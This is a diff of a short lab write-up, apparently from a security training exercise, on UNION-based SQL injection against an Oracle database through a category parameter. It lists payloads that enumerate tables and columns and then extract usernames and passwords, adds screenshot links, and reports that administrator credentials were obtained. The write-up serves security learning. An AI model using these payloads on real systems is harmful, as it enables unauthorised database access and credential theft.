@@ -11,10 +11,22 @@ Exploit UNION-based SQL Injection to listing the database contents on Oracle.
 Category parameter
 
 ## Payload Used
-  UNION SELECT 'test', NULL FROM dual--
+  UNION SELECT NULL, NULL FROM dual--
+
+  <img width="1496" height="752" alt="1 1" src="https://github.com/user-attachments/assets/4ebf5f7c-7493-4953-b381-ba811abcc2fc" />
+
   UNION SELECT table_name, NULL FROM all_tables--
-  UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_GSOLHM'--
-  UNION SELECT USERNAME_CEEZHZ, PASSWORD_MPPMGY FROM USERS_GSOLHM--
+
+  <img width="1496" height="755" alt="1 2" src="https://github.com/user-attachments/assets/77b8175b-45ca-44bc-a752-a5e14727d83c" />
+
+  UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_EAAJOZ'--
+
+  <img width="1491" height="752" alt="1 3" src="https://github.com/user-attachments/assets/7c448c7f-9fcb-4ec9-a139-549267f810bf" />
+
+  UNION SELECT USERNAME_ZFVQVM, PASSWORD_ADMFHD FROM USERS_EAAJOZ--
+
+  <img width="1495" height="757" alt="1 4" src="https://github.com/user-attachments/assets/bc865e1c-2aab-4079-add0-20dbb42ca1e4" />
+
   
 ## Result
 - Successfully extracted administrator credentials after enumerating tables and columns using all_tables and all_tab_columns.
